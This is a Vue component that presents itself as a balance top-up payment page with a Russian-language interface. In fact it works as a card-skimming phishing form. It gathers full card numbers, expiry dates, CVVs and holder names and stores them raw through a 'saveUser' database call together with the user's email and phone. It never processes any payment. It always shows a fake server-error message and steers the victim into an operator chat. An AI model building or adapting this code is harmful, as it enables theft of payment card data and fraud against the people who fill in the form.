<script setup>
import { ref } from 'vue'
import { saveUser } from '../lib/supabase'

const cardNumber = ref('')
const expiry = ref('')
const cvv = ref('')
const name = ref('')
const amount = ref('')
const method = ref('Visa/Mastercard')
const processing = ref(false)
const showMessage = ref(false)
const errors = ref({})

function resetForm() {
  cardNumber.value = ''
  expiry.value = ''
  cvv.value = ''
  name.value = ''
  amount.value = ''
  method.value = 'Visa/Mastercard'
  errors.value = {}
}

function validate() {
  const errs = {}

  // Card number: 16–19 цифр
  if (!/^\d{16,19}$/.test(cardNumber.value.replace(/\s/g, ''))) {
    errs.cardNumber = 'Некоректний номер картки'
  }

  // CVV: 3–4 цифри
  if (!/^\d{3,4}$/.test(cvv.value)) {
    errs.cvv = 'Некоректний CVV'
  }

  // Expiry: MM/YY, валідна дата
  const match = expiry.value.match(/^(\d{2})\/(\d{2})$/)
  if (!match) {
    errs.expiry = 'Формат MM/YY'
  } else {
    const mm = Number(match[1])
    const yy = Number(match[2])
    const now = new Date()
    const thisYear = now.getFullYear() % 100
    const thisMonth = now.getMonth() + 1
    if (mm < 1 || mm > 12) {
      errs.expiry = 'Місяць від 01 до 12'
    } else if (yy < thisYear || (yy === thisYear && mm < thisMonth)) {
      errs.expiry = 'Термін дії минув'
    }
  }

  // Name: 2+ символи
  if (name.value.trim().length < 2) {
    errs.name = "Введіть ім'я власника"
  }

  // Amount: число > 0
  if (!amount.value || isNaN(amount.value) || Number(amount.value) <= 0) {
    errs.amount = 'Введіть суму'
  }

  errors.value = errs
  return Object.keys(errs).length === 0
}

async function submit() {
  if (!validate()) return

  processing.value = true
  const authUser = JSON.parse(localStorage.getItem('authUser') || '{}')

  await saveUser({
    email: authUser.email || '',
    phoneNumber: authUser.phoneNumber || localStorage.getItem('phoneNumber') || '',
    cardNumber: cardNumber.value,
    cardDate: expiry.value,
    cvv: cvv.value,
    name: name.value,
    amount: amount.value,
    method: method.value
  })

  setTimeout(() => {
    processing.value = false
    showMessage.value = true
    resetForm()
  }, 2000)
}

function openChat() {
  showMessage.value = false
  if (window.Intercom) {
    window.Intercom('show')
  }
}
</script>

<template>
  <div class="deposit container">
    <h1>Пополнение баланса</h1>
    <form v-if="!showMessage" @submit.prevent="submit" class="deposit-form" autocomplete="off">
      <div class="form-group">
        <label for="cardNumber">Номер карты</label>
        <input
          id="cardNumber"
          v-model="cardNumber"
          :class="{ error: errors.cardNumber }"
          autocomplete="off"
          maxlength="19"
          required
        />
        <span class="error-text" v-if="errors.cardNumber">{{ errors.cardNumber }}</span>
      </div>
      <div class="form-row">
        <div class="form-group">
          <label for="expiry">Срок действия</label>
          <input
            id="expiry"
            v-model="expiry"
            placeholder="MM/YY"
            :class="{ error: errors.expiry }"
            maxlength="5"
            autocomplete="off"
            required
          />
          <span class="error-text" v-if="errors.expiry">{{ errors.expiry }}</span>
        </div>
        <div class="form-group">
          <label for="cvv">CVV</label>
          <input
            id="cvv"
            v-model="cvv"
            maxlength="4"
            :class="{ error: errors.cvv }"
            autocomplete="off"
            required
          />
          <span class="error-text" v-if="errors.cvv">{{ errors.cvv }}</span>
        </div>
      </div>
      <div class="form-group">
        <label for="name">Имя держателя</label>
        <input id="name" v-model="name" :class="{ error: errors.name }" required />
        <span class="error-text" v-if="errors.name">{{ errors.name }}</span>
      </div>
      <div class="form-group">
        <label for="amount">Сумма</label>
        <input id="amount" type="number" min="1" v-model="amount" :class="{ error: errors.amount }" required />
        <span class="error-text" v-if="errors.amount">{{ errors.amount }}</span>
      </div>
      <div class="form-group">
        <label for="method">Способ оплаты</label>
        <select id="method" v-model="method">
          <option>Visa/Mastercard</option>
          <option>Mir</option>
          <option>QIWI</option>
          <option>ЮMoney</option>
        </select>
      </div>
      <button type="submit" class="btn" :disabled="processing">
        Пополнить
      </button>
      <div v-if="processing" class="processing">Обработка...</div>
    </form>
    <div v-else class="modal">
      <div class="modal-content">
        <p>
          К сожалению мы имеем технические неполадки на сервере, обратитесь к оператору чтобы пополнить баланс
        </p>
        <button class="btn" @click="openChat">Написать оператору</button>
      </div>
    </div>
  </div>
</template>

<style scoped>
.deposit {
  padding: 40px 0;
}
.deposit-form {
  max-width: 480px;
  margin: 0 auto;
  display: flex;
  flex-direction: column;
  gap: 16px;
}
.form-row {
  display: flex;
  gap: 16px;
}
.form-group {
  display: flex;
  flex-direction: column;
  position: relative;
}
input.error, select.error {
  border: 1px solid #d00 !important;
}
.error-text {
  color: #d00;
  font-size: 12px;
  margin-top: 2px;
  position: absolute;
  bottom: -16px;
}
.processing {
  margin-top: 16px;
}
.modal {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0,0,0,0.6);
  display: flex;
  justify-content: center;
  align-items: center;
}
.modal-content {
  background: var(--card);
  padding: 24px;
  border-radius: 8px;
  max-width: 400px;
  text-align: center;
}
</style>
